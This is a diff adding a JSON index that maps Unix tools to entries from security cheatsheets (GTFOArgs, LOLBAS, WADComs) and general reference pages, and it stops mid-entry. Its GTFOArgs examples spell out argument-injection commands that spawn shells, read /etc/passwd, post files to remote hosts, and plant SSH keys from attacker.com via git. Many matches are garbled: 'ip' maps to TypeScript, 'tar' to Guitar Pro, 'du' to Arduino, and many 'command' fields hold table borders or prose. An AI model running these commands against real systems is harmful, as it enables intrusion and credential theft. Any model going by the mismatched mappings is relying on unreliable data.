@@ -1,0 +1,1331 @@
+{
+  "container-orchestrate-compose": {
+    "name": "docker-compose",
+    "matches": {
+      "reference": {
+        "file": "reference/source/_posts/docker.md",
+        "title": "Docker",
+        "examples": [
+          {
+            "description": "From Docker",
+            "command": "---"
+          },
+          {
+            "description": "From Docker",
+            "command": "- `-d` - Run the container in detached mode"
+          },
+          {
+            "description": "From Docker",
+            "command": "- `-p 80:80` - Map port 80 to port 80 in the container"
+          },
+          {
+            "description": "From Docker",
+            "command": "---"
+          },
+          {
+            "description": "From Docker",
+            "command": "- `-it` - Interactive bash mode"
+          }
+        ]
+      }
+    }
+  },
+  "dev-build-make": {
+    "name": "make",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/make.md",
+        "features": [
+          "shell"
+        ],
+        "examples": [
+          {
+            "description": "Can be used to execute arbitrary commands on a system and spawn shells either indirectly",
+            "command": "make -s --eval=$'x:\\n\\t-'\"/bin/sh\"\n"
+          }
+        ]
+      }
+    }
+  },
+  "dev-runtime-python3": {
+    "name": "python3",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "exploitation",
+          "post-exploitation"
+        ],
+        "category": "web"
+      },
+      "reference": {
+        "file": "reference/source/_posts/python.md",
+        "title": "Python",
+        "examples": [
+          {
+            "description": "From Python",
+            "command": ">>> print(\"Hello, World!\")"
+          },
+          {
+            "description": "From Python",
+            "command": "Hello, World!"
+          },
+          {
+            "description": "From Python",
+            "command": "age = 18      # age is of type int"
+          },
+          {
+            "description": "From Python",
+            "command": "name = \"John\" # name is now of type str"
+          },
+          {
+            "description": "From Python",
+            "command": "print(name)"
+          }
+        ]
+      }
+    }
+  },
+  "dev-vcs-git": {
+    "name": "git",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/git.md",
+        "features": [
+          "command",
+          "file-read",
+          "file-write"
+        ],
+        "examples": [
+          {
+            "description": "The --open-files-in-pager flag can be used to run arbitrary commands. Any of the following should work.",
+            "command": "git grep --open-files-in-pager='uname -a #' .\ngit grep --open-files-in-pager='uname;' .\n"
+          },
+          {
+            "description": "The --upload-pack flag can be used in multiple contexts. Note that the output is not necessarily shown (but you can route the output to stderr and possibly view it, by using `>&2`). ls-remote is the only example which does not require the command to be run within a tracked folder. Any of the following should work.",
+            "command": "git ls-remote --upload-pack='uname -a > /tmp/file #' main\ngit fetch origin --upload-pack='cat /etc/passwd >&2 ;'\ngit pull origin --upload-pack='wget attacker.com/key -O /root/.ssh/authorized-keys #'\n"
+          },
+          {
+            "description": "The `--upload-pack` / `-u` flag on `git clone` can execute commands. A colon in the positional argument helps trigger execution.",
+            "command": "git clone '-u$({touch,/tmp/foo})' ':x'\n"
+          },
+          {
+            "description": "This method takes advantage of one of the file-write methods to overwrite `.git/config`. Officially, this is probably out of scope of GTFOArgs, but it is included anyways. `id` is executed and written to `/tmp/fsmonitor` in this example.",
+            "command": "git commit --allow-empty -m 'fsmonitor = \"id>/tmp/fsmonitor\"'\ngit commit --allow-empty -m '[core]'\ngit log --max-count=2 --pretty=format:\"%s\" --output=./.git/config\ngit status\n"
+          },
+          {
+            "description": "It is common to use `git diff` to compare a single file to a different version of itself in history. The `--no-index` flag can be used to effectively turn `git diff` into normal `diff` against another file _within the git repository_ (but not necessarily tracked).",
+            "command": "git diff --no-index local-secret-file.conf git.md\n"
+          }
+        ]
+      },
+      "netrunners": {
+        "phases": [
+          "exploitation"
+        ],
+        "category": "web"
+      },
+      "reference": {
+        "file": "reference/source/_posts/gitlab.md",
+        "title": "GitLab",
+        "examples": [
+          {
+            "description": "From Github CLI",
+            "command": "type -p curl >/dev/null || (sudo apt update && sudo apt install curl -y)"
+          },
+          {
+            "description": "From Github CLI",
+            "command": "curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg \\"
+          },
+          {
+            "description": "From Github CLI",
+            "command": "&& sudo chmod go+r /usr/share/keyrings/githubcli-archive-keyring.gpg \\"
+          },
+          {
+            "description": "From Github CLI",
+            "command": "$ gh auth --with-token < token.txt"
+          },
+          {
+            "description": "From Github CLI",
+            "command": "$ gh search issues readme typo"
+          }
+        ]
+      }
+    }
+  },
+  "network-config-ip": {
+    "name": "ip",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "enumeration",
+          "exploitation",
+          "post-exploitation",
+          "shell"
+        ],
+        "category": "revshell"
+      },
+      "reference": {
+        "file": "reference/source/_posts/typescript.md",
+        "title": "TypeScript",
+        "examples": [
+          {
+            "description": "From TypeScript",
+            "command": "npm install typescript --save-dev"
+          },
+          {
+            "description": "From TypeScript",
+            "command": "npm tsc"
+          },
+          {
+            "description": "From TypeScript",
+            "command": "let age: number = 25;"
+          },
+          {
+            "description": "From TypeScript",
+            "command": "let name: string = \"Alice\";"
+          },
+          {
+            "description": "From TypeScript",
+            "command": "let isOnline: boolean = true;"
+          }
+        ]
+      }
+    }
+  },
+  "network-dns-dig": {
+    "name": "dig",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/dig.md",
+        "features": [
+          "file-read"
+        ],
+        "examples": [
+          {
+            "description": "Read an arbitrary file by specifying it as a batch file. Note that this will leak lines of the file read as outbound DNS lookups.",
+            "command": "dig -f /etc/passwd\n"
+          }
+        ]
+      }
+    }
+  },
+  "network-http-curl": {
+    "name": "curl",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/curl.md",
+        "features": [
+          "file-upload",
+          "file-read",
+          "file-download",
+          "file-write"
+        ],
+        "examples": [
+          {
+            "description": "Send a local file to a remote server in a POST request.",
+            "command": "curl --data @/etc/passwd http://website.com/\n"
+          },
+          {
+            "description": "Send a local file to a remote server in a POST request.",
+            "command": "curl -F 'var=@/etc/passwd' http://website.com/\n"
+          },
+          {
+            "description": "Send a local file to a remote server in a POST request.",
+            "command": "curl --upload-file /etc/passwd http://website.com/\n"
+          },
+          {
+            "description": "Read local files by using the file:// schema.",
+            "command": "curl file:///etc/passwd\n"
+          },
+          {
+            "description": "Downloads a file to a destination.",
+            "command": "curl http://website.com/ -o /tmp/\n"
+          }
+        ]
+      },
+      "reference": {
+        "file": "reference/source/_posts/curl.md",
+        "title": "Curl",
+        "examples": [
+          {
+            "description": "From Curl",
+            "command": "-o <file>    # --output: write to file"
+          },
+          {
+            "description": "From Curl",
+            "command": "-u user:pass # --user: authentication"
+          },
+          {
+            "description": "From Curl",
+            "command": "-v   # --verbose: Make curl verbose during operation"
+          },
+          {
+            "description": "From Curl",
+            "command": "-vv  # more verbose"
+          },
+          {
+            "description": "From Curl",
+            "command": "-s   # --silent: don't show progress meter or errors"
+          }
+        ]
+      }
+    }
+  },
+  "network-http-wget": {
+    "name": "wget",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/wget.md",
+        "features": [
+          "command",
+          "file-upload",
+          "file-read",
+          "file-write",
+          "file-download"
+        ],
+        "examples": [
+          {
+            "description": "Can be used to execute any command or file on a system, but without any arguments, and without stdout/stderr. This can be useful if you are able to write an executable to the server beforehand. The example here invokes /sbin/reboot.",
+            "command": "wget --use-askpass=/sbin/reboot http://0/\n"
+          },
+          {
+            "description": "Send a local file to a remote server in a POST request. Note that the file will be sent as-is.",
+            "command": "wget --post-file=/etc/passwd http://0/\n"
+          },
+          {
+            "description": "Read local files by importing the file as URIs to be retrieved. The content of the file will be displayed as error messages.",
+            "command": "wget --input-file=/etc/passwd http://0/\n"
+          },
+          {
+            "description": "Reads local data and writes the output to a file. This is only suitable for displaying non-binary files, as the output is an error-log.",
+            "command": "wget --input-file=/etc/passwd --output-file=/tmp/passwd.txt\n"
+          },
+          {
+            "description": "Downloads a remote file via an HTTP GET request and saves it to a specific location.",
+            "command": "wget --output-document=/root/.ssh/authorized_keys http://0/\n"
+          }
+        ]
+      },
+      "netrunners": {
+        "phases": [
+          "shell"
+        ],
+        "category": "usefull"
+      }
+    }
+  },
+  "network-remote-ssh": {
+    "name": "ssh",
+    "matches": {
+      "lolbas": {
+        "file": "LOLBAS/yml/OSBinaries/Ssh.yml",
+        "mitre_ids": [
+          "T1202"
+        ],
+        "contributor": "Akshat Pradhan",
+        "category": ""
+      },
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/ssh.md",
+        "features": [
+          "shell",
+          "file-upload",
+          "file-download",
+          "file-read",
+          "command"
+        ],
+        "examples": [
+          {
+            "description": "Spawn interactive shell on client. Does not require a successful connection.",
+            "command": "ssh -o ProxyCommand=';sh 0<&2 1>&2' host\n"
+          },
+          {
+            "description": "Spawn interactive shell on client. Requires a successful connection towards `host`.",
+            "command": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host\n"
+          },
+          {
+            "description": "Sends a local file (`/etc/passwd`) to a remote SSH server and saves it in a location (`/tmp/out`).",
+            "command": "ssh host \"cat /tmp/out\" < /etc/passwd\n"
+          },
+          {
+            "description": "Retrieves a remote file from an SSH server (`/tmp/infile`) and saves it to a local destination (`/root/.ssh/authorized_keys`).",
+            "command": "ssh host \"cat /tmp/infile\" > /root/.ssh/authorized_keys\n"
+          },
+          {
+            "description": "Reads a file and outputs it in an error message.",
+            "command": "ssh -F /etc/passwd host\n"
+          }
+        ]
+      },
+      "netrunners": {
+        "phases": [
+          "enumeration"
+        ],
+        "category": "KERBEROS"
+      },
+      "reference": {
+        "file": "reference/source/_posts/ssh.md",
+        "title": "SSH",
+        "examples": [
+          {
+            "description": "From SSH",
+            "command": "Connect on a specific port"
+          },
+          {
+            "description": "From SSH",
+            "command": "Connect via pem file (0400 permissions)"
+          },
+          {
+            "description": "From SSH",
+            "command": "See: [SSH Permissions](/chmod#ssh-permissions)"
+          },
+          {
+            "description": "From SSH",
+            "command": "Executes remote command"
+          },
+          {
+            "description": "From SSH",
+            "command": "Invoke a local script"
+          }
+        ]
+      }
+    }
+  },
+  "network-socket-socat": {
+    "name": "socat",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/socat.md",
+        "features": [
+          "file-read",
+          "shell",
+          "command"
+        ],
+        "examples": [
+          {
+            "description": "The command leverages socats ability to relay data, reading arbitary file by opening it in read-only mode.",
+            "command": "socat -u OPEN:/etc/passwd,rdonly STDOUT\n"
+          },
+          {
+            "description": "The exec argument runs an arbitrary command and spawn a shell.",
+            "command": "socat stdin exec:bash\n"
+          },
+          {
+            "description": "The exec argument runs an arbitrary command.",
+            "command": "socat stdin exec:whoami\n"
+          }
+        ]
+      }
+    }
+  },
+  "network-transfer-ftp": {
+    "name": "ftp",
+    "matches": {
+      "lolbas": {
+        "file": "LOLBAS/yml/OSBinaries/Ftp.yml",
+        "mitre_ids": [
+          "T1105",
+          "T1202"
+        ],
+        "contributor": "Oddvar Moe",
+        "category": ""
+      },
+      "netrunners": {
+        "phases": [
+          "enumeration",
+          "exploitation"
+        ],
+        "category": "web"
+      }
+    }
+  },
+  "network-transfer-sftp": {
+    "name": "sftp",
+    "matches": {
+      "lolbas": {
+        "file": "LOLBAS/yml/OSBinaries/Sftp.yml",
+        "mitre_ids": [
+          "T1202"
+        ],
+        "contributor": "Swachchhanda Shrawan Poudel",
+        "category": ""
+      },
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/sftp.md",
+        "features": [
+          "command"
+        ],
+        "examples": [
+          {
+            "description": "Can be used to execute any command or file on a system, but without stdin/stdout/stderr.",
+            "command": "sftp -D\"touch /tmp/korewashere\"\n"
+          }
+        ]
+      }
+    }
+  },
+  "security-crypto-openssl": {
+    "name": "openssl",
+    "matches": {
+      "reference": {
+        "file": "reference/source/_posts/openssl.md",
+        "title": "OpenSSL",
+        "examples": [
+          {
+            "description": "From OpenSSL",
+            "command": "openssl rsa -check -text -in privateKey.key"
+          },
+          {
+            "description": "From OpenSSL",
+            "command": "openssl rsa -noout -modulus -in privateKey.key | openssl md5"
+          },
+          {
+            "description": "From OpenSSL",
+            "command": "openssl rsa -noout -modulus -in privateKey.key | openssl sha1"
+          },
+          {
+            "description": "From OpenSSL",
+            "command": "openssl rsa -noout -modulus -in privateKey.key | openssl sha256"
+          },
+          {
+            "description": "From OpenSSL",
+            "command": "openssl rsa -aes256 -in privateKey.key -out newPrivateKey.key"
+          }
+        ]
+      }
+    }
+  },
+  "security-recon-nmap": {
+    "name": "nmap",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "enumeration"
+        ],
+        "category": "web"
+      },
+      "reference": {
+        "file": "reference/source/_posts/nmap.md",
+        "title": "Nmap",
+        "examples": [
+          {
+            "description": "From Nmap",
+            "command": "nmap -p- -T5 target"
+          },
+          {
+            "description": "From Nmap",
+            "command": "nmap -sV -O -p- -T5 target"
+          },
+          {
+            "description": "From Nmap",
+            "command": "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 15:17 CET"
+          },
+          {
+            "description": "From Nmap",
+            "command": "Nmap scan report for target (10.10.158.161)"
+          }
+        ]
+      }
+    }
+  },
+  "system-archive-tar": {
+    "name": "tar",
+    "matches": {
+      "lolbas": {
+        "file": "LOLBAS/yml/OSBinaries/Tar.yml",
+        "mitre_ids": [
+          "T1105",
+          "T1564.004"
+        ],
+        "contributor": "Brian Lucero",
+        "category": ""
+      },
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/tar.md",
+        "features": [
+          "shell",
+          "command",
+          "file-upload",
+          "file-download",
+          "file-read"
+        ],
+        "examples": [
+          {
+            "description": "The --to-command is normally used to pipe extracted files to a command. This can be used to run arbitrary commands on a host. The file must be a valid archive file.",
+            "command": "tar xf /tmp/valid.tar --to-command='/bin/sh -c \"sh <&2 1>&2\"'\n"
+          },
+          {
+            "description": "Similar to the above, but at a previous stage in the extraction. A valid archive is not required. This functionality can be abused in various ways for file-read and file-write (see below).",
+            "command": "tar xf /dev/null --use-compress-program='/bin/sh -c \"sh <&2 1>&2\"'\n"
+          },
+          {
+            "description": "GNU tar specifc. The -F / --info-script= / --new-volume-script= arguments will run a command at volume rotation. Other flags used are to force frequent rotation.",
+            "command": "tar cf /dev/null --record-size=512 -L1 -F'/bin/sh -c \"sh <&2 1>&2\"' /tmp/\n"
+          },
+          {
+            "description": "During archive creation, `--checkpoint` and `--checkpoint-action` can execute arbitrary commands. Requires injecting two arguments and a positional argument.",
+            "command": "tar '--checkpoint=1' '--checkpoint-action=exec=\"sh shell.sh\"'\n"
+          },
+          {
+            "description": "This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).",
+            "command": "tar cvf remote_user@remote_host.com:/tmp/remote_file.tar /etc/passwd --rsh-command=/bin/ssh\n"
+          }
+        ]
+      },
+      "netrunners": {
+        "phases": [
+          "enumeration",
+          "exploitation"
+        ],
+        "category": "web"
+      },
+      "reference": {
+        "file": "reference/source/_posts/guitar-pro.md",
+        "title": "Guitar Pro"
+      }
+    }
+  },
+  "system-file-base64": {
+    "name": "base64",
+    "matches": {
+      "wadcoms": {
+        "file": "WADComs.github.io/_wadcoms/PKINIT-gettgtpkinit.md",
+        "items": [
+          "Username",
+          "Password",
+          "PFX"
+        ],
+        "services": [
+          "Kerberos"
+        ],
+        "attack_types": [
+          "Exploitation",
+          "PrivEsc"
+        ],
+        "os": [
+          "Linux",
+          "Windows"
+        ]
+      }
+    }
+  },
+  "system-file-cat": {
+    "name": "cat",
+    "matches": {
+      "wadcoms": {
+        "file": "WADComs.github.io/_wadcoms/ADCSEnumaration.md",
+        "items": [
+          "Shell"
+        ],
+        "services": [],
+        "attack_types": [
+          "Enumeration"
+        ],
+        "os": [
+          "Windows"
+        ]
+      },
+      "netrunners": {
+        "phases": [
+          "shell"
+        ],
+        "category": "revshell"
+      },
+      "reference": {
+        "file": "reference/source/_posts/nc.md",
+        "title": "Netcat",
+        "examples": [
+          {
+            "description": "From Netcat",
+            "command": "Listen for incoming connections"
+          },
+          {
+            "description": "From Netcat",
+            "command": "| Option | Description                | Example                                  |"
+          },
+          {
+            "description": "From Netcat",
+            "command": "| ------ | -------------------------- | ---------------------------------------- |"
+          },
+          {
+            "description": "From Netcat",
+            "command": "Client"
+          },
+          {
+            "description": "From Netcat",
+            "command": "or"
+          }
+        ]
+      }
+    }
+  },
+  "system-file-chmod": {
+    "name": "chmod",
+    "matches": {
+      "reference": {
+        "file": "reference/source/_posts/chmod.md",
+        "title": "Chmod",
+        "examples": [
+          {
+            "description": "From Chmod",
+            "command": "The `chmod` command stands for \"change mode\""
+          },
+          {
+            "description": "From Chmod",
+            "command": "<widget name=\"chmod\"/>"
+          },
+          {
+            "description": "From Chmod",
+            "command": "| Permission | Description             | Octal | Decimal   |"
+          },
+          {
+            "description": "From Chmod",
+            "command": "| ---------- | ----------------------- | ----- | --------- |"
+          }
+        ]
+      }
+    }
+  },
+  "system-file-comm": {
+    "name": "comm",
+    "matches": {
+      "wadcoms": {
+        "file": "WADComs.github.io/_wadcoms/Rubeus-s4u.md",
+        "items": [
+          "Hash",
+          "Username",
+          "target",
+          "service"
+        ],
+        "services": [
+          "Kerberos"
+        ],
+        "attack_types": [
+          "Exploitation",
+          "Lateral Movement",
+          "Privilidge Escalation"
+        ],
+        "os": [
+          "Windows"
+        ]
+      },
+      "reference": {
+        "file": "reference/source/_posts/conventional-commits.md",
+        "title": "Conventional Commits",
+        "examples": [
+          {
+            "description": "From Conventional Commits",
+            "command": "<type>[optional scope]: <description>"
+          }
+        ]
+      }
+    }
+  },
+  "system-file-cp": {
+    "name": "cp",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "shell"
+        ],
+        "category": "revshell"
+      }
+    }
+  },
+  "system-file-cut": {
+    "name": "cut",
+    "matches": {
+      "reference": {
+        "file": "reference/source/_posts/notion.md",
+        "title": "Notion Shortcuts"
+      }
+    }
+  },
+  "system-file-dd": {
+    "name": "dd",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "exploitation"
+        ],
+        "category": "KERBEROS"
+      },
+      "reference": {
+        "file": "reference/source/_posts/reddit.md",
+        "title": "Reddit"
+      }
+    }
+  },
+  "system-file-file": {
+    "name": "file",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/file.md",
+        "features": [
+          "file-read"
+        ],
+        "examples": [
+          {
+            "description": "Read an arbitrary file by specifying it as a magic file. This will\nresult in errors containing the lines of the file. The argument parsing\ndone by file also means this can be specified as a single argument.\n",
+            "command": "file -m/etc/passwd\n"
+          }
+        ]
+      },
+      "netrunners": {
+        "phases": [
+          "enumeration",
+          "exploitation",
+          "shell"
+        ],
+        "category": "revshell"
+      },
+      "reference": {
+        "file": "reference/source/_posts/filezilla.md",
+        "title": "FileZilla"
+      }
+    }
+  },
+  "system-file-find": {
+    "name": "find",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/find.md",
+        "features": [
+          "shell",
+          "command",
+          "file-read",
+          "file-write"
+        ],
+        "examples": [
+          {
+            "description": "Can be used to execute arbitrary commands on a system and spawn shells either indirectly",
+            "command": "find . -name i_do_not_exist -or -exec perl -e 'exec sh' ; -quit\n"
+          },
+          {
+            "description": "or directly.",
+            "command": "find . -exec /bin/sh ; -quit\n"
+          },
+          {
+            "description": "Can be used to execute arbitrary commands on a system.",
+            "command": "find . -name i_do_not_exist -or -exec ls ; -quit\n"
+          },
+          {
+            "description": "Reading of files is possible by executing cat.",
+            "command": "find /etc/passwd -exec cat {} ;\n"
+          },
+          {
+            "description": "Find has various capabilities to write to files and it is recommended to read the manual for more details, especially its fprintf and 'UNUSUAL FILENAMES' sections.",
+            "command": "find . -fprintf /root/.authorized_keys 'ssh-rsa ...' -quit\n"
+          }
+        ]
+      },
+      "netrunners": {
+        "phases": [
+          "enumeration",
+          "shell"
+        ],
+        "category": "usefull"
+      },
+      "reference": {
+        "file": "reference/source/_posts/finder.md",
+        "title": "Finder",
+        "examples": [
+          {
+            "description": "From Find",
+            "command": "Wildcard"
+          },
+          {
+            "description": "From Find",
+            "command": "---"
+          },
+          {
+            "description": "From Find",
+            "command": "- [Regex reference](/regex) _(cheatsheets.zip)_"
+          },
+          {
+            "description": "From Find",
+            "command": "- [Find cheatsheet](https://gist.github.com/gr1ev0us/3a9b9d9dbdd38f6379288eb2686fc538) _(gist.github.com)_"
+          },
+          {
+            "description": "From Find",
+            "command": "Find all smaller than 10MB files"
+          }
+        ]
+      }
+    }
+  },
+  "system-file-ln": {
+    "name": "ln",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "enumeration"
+        ],
+        "category": "web"
+      },
+      "reference": {
+        "file": "reference/source/_posts/telnet.md",
+        "title": "Telnet",
+        "examples": [
+          {
+            "description": "From Telnet",
+            "command": "communicate over http protocol"
+          },
+          {
+            "description": "From Telnet",
+            "command": "create traceroute file"
+          }
+        ]
+      }
+    }
+  },
+  "system-file-od": {
+    "name": "od",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "enumeration"
+        ],
+        "category": "KERBEROS"
+      },
+      "reference": {
+        "file": "reference/source/_posts/http-status-code.md",
+        "title": "HTTP Status Code",
+        "examples": [
+          {
+            "description": "From MongoDB",
+            "command": "mongo # connects to mongodb://127.0.0.1:27017 by default"
+          },
+          {
+            "description": "From MongoDB",
+            "command": "mongo --host <host> --port <port> -u <user> -p <pwd> # omit the password if you want a prompt"
+          },
+          {
+            "description": "From MongoDB",
+            "command": "mongo \"mongodb://192.168.1.1:27017\""
+          },
+          {
+            "description": "From MongoDB",
+            "command": "mongo \"mongodb+srv://cluster-name.abcde.mongodb.net/<dbname>\" --username <username> # MongoDB Atlas"
+          },
+          {
+            "description": "From MongoDB",
+            "command": "db // prints the current database"
+          }
+        ]
+      }
+    }
+  },
+  "system-file-rm": {
+    "name": "rm",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "exploitation",
+          "post-exploitation",
+          "shell"
+        ],
+        "category": "revshell"
+      },
+      "reference": {
+        "file": "reference/source/_posts/terraform.md",
+        "title": "Terraform",
+        "examples": [
+          {
+            "description": "From Terraform",
+            "command": "(Block Name)  (Resource Type)  (Resource Name)"
+          },
+          {
+            "description": "From Terraform",
+            "command": "|           |                 |"
+          },
+          {
+            "description": "From Terraform",
+            "command": "\u25bd           \u25bd                 \u25bd"
+          },
+          {
+            "description": "From Terraform",
+            "command": "variable \"<VAR NAME>\" {"
+          },
+          {
+            "description": "From Terraform",
+            "command": "description = \"<DESCRIPTION OF THE VAR>\""
+          }
+        ]
+      }
+    }
+  },
+  "system-file-stat": {
+    "name": "stat",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "enumeration"
+        ],
+        "category": "web"
+      },
+      "reference": {
+        "file": "reference/source/_posts/netstat.md",
+        "title": "Netstat",
+        "examples": [
+          {
+            "description": "From Netstat",
+            "command": "Netstat Help"
+          }
+        ]
+      }
+    }
+  },
+  "system-file-tr": {
+    "name": "tr",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "post-exploitation",
+          "shell"
+        ],
+        "category": "revshell"
+      },
+      "reference": {
+        "file": "reference/source/_posts/trello.md",
+        "title": "Trello"
+      }
+    }
+  },
+  "system-process-free": {
+    "name": "free",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "post-exploitation"
+        ],
+        "category": "Active Directory"
+      }
+    }
+  },
+  "system-process-ps": {
+    "name": "ps",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "enumeration",
+          "post-exploitation",
+          "shell"
+        ],
+        "category": "usefull"
+      },
+      "reference": {
+        "file": "reference/source/_posts/phpstorm.md",
+        "title": "PhpStorm"
+      }
+    }
+  },
+  "system-process-top": {
+    "name": "top",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "enumeration"
+        ],
+        "category": "web"
+      },
+      "reference": {
+        "file": "reference/source/_posts/telegram.md",
+        "title": "Telegram Desktop"
+      }
+    }
+  },
+  "system-scheduler-cron": {
+    "name": "cron",
+    "matches": {
+      "reference": {
+        "file": "reference/source/_posts/cron.md",
+        "title": "Cron",
+        "examples": [
+          {
+            "description": "From Cron",
+            "command": "Min  Hour Day  Mon  Weekday"
+          },
+          {
+            "description": "From Cron",
+            "command": "*    *    *    *    *  command to be executed"
+          },
+          {
+            "description": "From Cron",
+            "command": "\u252c    \u252c    \u252c    \u252c    \u252c"
+          },
+          {
+            "description": "From Cron",
+            "command": "\u2502    \u2502    \u2502    \u2502    \u2514\u2500  Day of Week   (0=Sun .. 6=Sat)"
+          },
+          {
+            "description": "From Cron",
+            "command": "\u2502    \u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500  Month         (1..12)"
+          }
+        ]
+      }
+    }
+  },
+  "system-shell-bash": {
+    "name": "bash",
+    "matches": {
+      "lolbas": {
+        "file": "LOLBAS/yml/OSBinaries/Bash.yml",
+        "mitre_ids": [
+          "T1202",
+          "T1218"
+        ],
+        "contributor": "Oddvar Moe",
+        "category": ""
+      },
+      "netrunners": {
+        "phases": [
+          "shell"
+        ],
+        "category": "revshell"
+      },
+      "reference": {
+        "file": "reference/source/_posts/bash.md",
+        "title": "Bash",
+        "examples": [
+          {
+            "description": "From Bash",
+            "command": "VAR=\"world\""
+          },
+          {
+            "description": "From Bash",
+            "command": "echo \"Hello $VAR!\" # => Hello world!"
+          },
+          {
+            "description": "From Bash",
+            "command": "Multi-line comments use `:'` to open and `'` to close"
+          },
+          {
+            "description": "From Bash",
+            "command": "| Expression  | Description                           |"
+          }
+        ]
+      }
+    }
+  },
+  "system-storage-du": {
+    "name": "du",
+    "matches": {
+      "wadcoms": {
+        "file": "WADComs.github.io/_wadcoms/Powershell-ADModule-enum.md",
+        "items": [],
+        "services": [],
+        "attack_types": [
+          "Discovery",
+          "Credential Access"
+        ],
+        "os": [
+          "Windows"
+        ]
+      },
+      "netrunners": {
+        "phases": [
+          "exploitation",
+          "post-exploitation",
+          "shell"
+        ],
+        "category": "revshell"
+      },
+      "reference": {
+        "file": "reference/source/_posts/arduino-programming.md",
+        "title": "Arduino Programming",
+        "examples": [
+          {
+            "description": "From Arduino Programming",
+            "command": "void setup() {"
+          },
+          {
+            "description": "From Arduino Programming",
+            "command": "// Code here runs once"
+          },
+          {
+            "description": "From Arduino Programming",
+            "command": "}"
+          },
+          {
+            "description": "From Arduino Programming",
+            "command": "// Single-line comment"
+          },
+          {
+            "description": "From Arduino Programming",
+            "command": "Multi-line"
+          }
+        ]
+      }
+    }
+  },
+  "system-storage-mount": {
+    "name": "mount",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "shell"
+        ],
+        "category": "usefull"
+      }
+    }
+  },
+  "system-terminal-tmux": {
+    "name": "tmux",
+    "matches": {
+      "reference": {
+        "file": "reference/source/_posts/tmux.md",
+        "title": "Tmux",
+        "examples": [
+          {
+            "description": "From Tmux",
+            "command": "Start a new named session"
+          },
+          {
+            "description": "From Tmux",
+            "command": "Show all sessions"
+          },
+          {
+            "description": "From Tmux",
+            "command": "Attach to last session"
+          },
+          {
+            "description": "From Tmux",
+            "command": "Attach to named"
+          },
+          {
+            "description": "From Tmux",
+            "command": "Kill a session by name"
+          }
+        ]
+      }
+    }
+  },
+  "text-process-awk": {
+    "name": "awk",
+    "matches": {
+      "gtfoargs": {
+        "file": "GTFOArgs.github.io/_gtfoargs/awk.md",
+        "features": [
+          "shell",
+          "command",
+          "file-read",
+          "file-write"
+        ],
+        "examples": [
+          {
+            "description": "Can be used to execute arbitrary commands on a system and spawn shells.",
+            "command": "awk 'BEGIN{system(\"/bin/sh\")}'"
+          },
+          {
+            "description": "Can be used to execute arbitrary commands on a system.",
+            "command": "awk 'BEGIN {system(\"ls\"); exit}' /dev/null\n"
+          },
+          {
+            "description": "The file must exist and command will be executed as many rows there are in the file.",
+            "command": "awk 'system(\"ls\")' /etc/passwd\n"
+          },
+          {
+            "description": "If spaces cannot be inserted, we can use `sprintf(%c,32)` to emulate them.",
+            "command": "awk '//{}BEGIN{system(sprintf(\"uname%c-aa\",32))}'\n"
+          },
+          {
+            "description": "Read an arbitrary file.",
+            "command": "awk 'BEGIN{while((getline line<\"/etc/passwd\")>0){print line}}' /dev/null\n"
+          }
+        ]
+      },
+      "reference": {
+        "file": "reference/source/_posts/awk.md",
+        "title": "Awk",
+        "examples": [
+          {
+            "description": "From Awk",
+            "command": "---"
+          },
+          {
+            "description": "From Awk",
+            "command": "| -             | -                         |"
+          },
+          {
+            "description": "From Awk",
+            "command": "| ------------- | ------------------------- |"
+          },
+          {
+            "description": "From Awk",
+            "command": "---"
+          },
+          {
+            "description": "From Awk",
+            "command": "See: [Variables](#awk-variables)"
+          }
+        ]
+      }
+    }
+  },
+  "text-process-jq": {
+    "name": "jq",
+    "matches": {
+      "reference": {
+        "file": "reference/source/_posts/jquery.md",
+        "title": "jQuery"
+      }
+    }
+  },
+  "text-process-sed": {
+    "name": "sed",
+    "matches": {
+      "reference": {
+        "file": "reference/source/_posts/sed.md",
+        "title": "Sed",
+        "examples": [
+          {
+            "description": "From Sed",
+            "command": "With pipeline"
+          },
+          {
+            "description": "From Sed",
+            "command": "| Option | Example                                    | Description                             |"
+          },
+          {
+            "description": "From Sed",
+            "command": "| ------ | ------------------------------------------ | --------------------------------------- |"
+          },
+          {
+            "description": "From Sed",
+            "command": "Use `-e` to execute multiple sed commands"
+          },
+          {
+            "description": "From Sed",
+            "command": "Use `-f` to execute sed script file"
+          }
+        ]
+      }
+    }
+  },
+  "text-search-grep": {
+    "name": "grep",
+    "matches": {
+      "netrunners": {
+        "phases": [
+          "shell"
+        ],
+        "category": "usefull"
+      },
+      "reference": {
+        "file": "reference/source/_posts/grep.md",
